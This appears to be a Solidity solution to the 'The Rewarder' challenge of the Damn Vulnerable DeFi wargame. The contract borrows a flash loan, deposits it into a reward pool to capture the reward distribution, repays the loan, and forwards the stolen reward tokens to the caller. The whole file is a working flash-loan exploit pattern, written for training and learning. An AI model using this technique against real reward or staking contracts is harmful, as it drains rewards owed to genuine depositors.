// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/RewardToken.sol";
import "../DamnValuableToken.sol";

contract TheRewarderChallenge {
    
    TheRewarderPool rewarderPool;
    FlashLoanerPool loanerPool;
    DamnValuableToken token;
    RewardToken rewardToken;

    constructor(address loanerAddress, address rewarderAddress, address tokenAddress, address rewardTokenAddress) {
        rewarderPool = TheRewarderPool(rewarderAddress);
        loanerPool = FlashLoanerPool(loanerAddress);
        token = DamnValuableToken(tokenAddress);
        rewardToken = RewardToken(rewardTokenAddress);
    }

    function receiveFlashLoan(uint256 amount) external {
        token.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.distributeRewards();
        rewarderPool.withdraw(amount);
        token.transfer(address(loanerPool), amount);
    }

    function attack() external {
        loanerPool.flashLoan(10 ** (6 + token.decimals()));
        uint256 totalReward = rewardToken.balanceOf(address(this));
        rewardToken.transfer(msg.sender, totalReward);
    }
}